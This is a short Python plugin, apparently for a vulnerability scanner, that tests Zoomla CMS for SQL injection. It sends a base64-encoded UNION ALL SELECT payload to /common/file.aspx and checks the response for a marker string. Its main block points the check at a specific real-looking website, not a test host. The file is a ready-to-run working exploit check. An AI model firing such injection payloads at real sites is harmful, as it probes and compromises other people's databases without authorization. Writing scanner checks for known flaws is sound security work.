#!/usr/bin/env python
# -*- coding: utf-8 -*-
#_Author_ = peta
#_PlugName_ = Zoomla all version sql injection
#_FileName_ = Zoomla__all__sql_inj.py
#_Refer_ = http://www.wooyun.org/bugs/wooyun-2014-071205

import urlparse


def assign(service, arg):
	if service != 'zoomla':
		return
	arr = urlparse.urlparse(arg)
	return True, '%s://%s' % (arr.scheme, arr.netloc)
		
def audit(arg):
	payload = ("/common/file.aspx?FD=MDAnIFVOSU9OIEFMTCBTRUxFQ1QgTlVMTCwgQ0hBUigxMTUpK0NIQVIoMTEzKStDSEFSKDEwOCkrQ0hBUig5NSkrQ0h"
                   "BUigxMDUpK0NIQVIoMTEwKStDSEFSKDEwNikrQ0hBUig5NSkrQ0hBUigxMTgpK0NIQVIoMTAxKStDSEFSKDExNCkrQ0hBUigxMDUpK0NIQVIoMT"
                   "AyKStDSEFSKDEyMSksTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLS0g&state=tr")
	target = arg + payload
	code, head, body, errcode, final_url = curl.curl('"%s"' % target)
	
	if code == 500 and "sql_inj_verify" in body:
		security_hole(arg)
		
if __name__ == '__main__':
    from dummy import *
    audit(assign('zoomla', 'http://www.njzxw.cn/')[1])